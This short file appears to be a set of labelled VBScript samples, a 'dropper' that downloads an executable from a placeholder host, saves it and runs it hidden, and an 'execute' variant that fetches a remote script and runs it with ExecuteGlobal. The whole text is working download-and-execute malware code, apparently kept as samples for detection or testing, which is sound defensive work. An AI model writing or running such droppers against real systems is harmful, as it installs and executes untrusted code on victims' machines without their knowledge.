VBS_DROPPER.plain:
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "https://files.example.invalid/a.exe", False
http.Send
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write http.responseBody
stream.SaveToFile "a.exe", 2
CreateObject("WScript.Shell").Run "a.exe", 0, False

VBS_EXECUTE.plain:
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "https://files.example.invalid/step.vbs", False
http.Send
ExecuteGlobal http.responseText
